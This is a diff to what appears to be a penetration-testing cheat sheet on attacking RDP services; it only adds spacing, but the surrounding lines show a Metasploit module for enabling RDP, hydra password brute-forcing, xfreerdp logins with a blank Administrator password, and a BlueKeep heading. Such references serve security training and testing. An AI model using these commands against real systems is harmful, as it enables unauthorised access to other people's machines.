@@ -5,6 +5,8 @@
 **Ports**: TCP 3389
 **Known Vulnerabilities**: Weak credentials, BlueKeep vulnerability (CVE-2019-0708)
 
+<br>
+
 # Check and Enable RDP
 
 ```shell
@@ -15,12 +17,16 @@ use post/windows/manage/enable_rdp
 set SESSION <session_number>
 ```
 
+<br>
+
 # Brute-force
 
 ```shell
 hydra -L <user_wordlists> -P <password_wordlists> rdp://<target_IP>:<port>
 hydra -L <user_wordlists> -P <password_wordlists> rdp://<target_IP>:<port> -s <port> # Use -s if port ≠ 3389
 ```
+
+<br>
 
 # Accessing RDP
 
@@ -32,6 +38,8 @@ xfreerdp /u:<username> /p:<password> /v:<target_IP>:<port>
 xfreerdp /v:<target_IP> /u:Administrator /cert:ignore
 # This command connects to the Remote Desktop Protocol (RDP) service on the target using the username Administrator with a blank password, while ignoring any certificate warnings.
 ```
+
+<br>
 
 # BlueKeep (CVE-2019-0708)
 
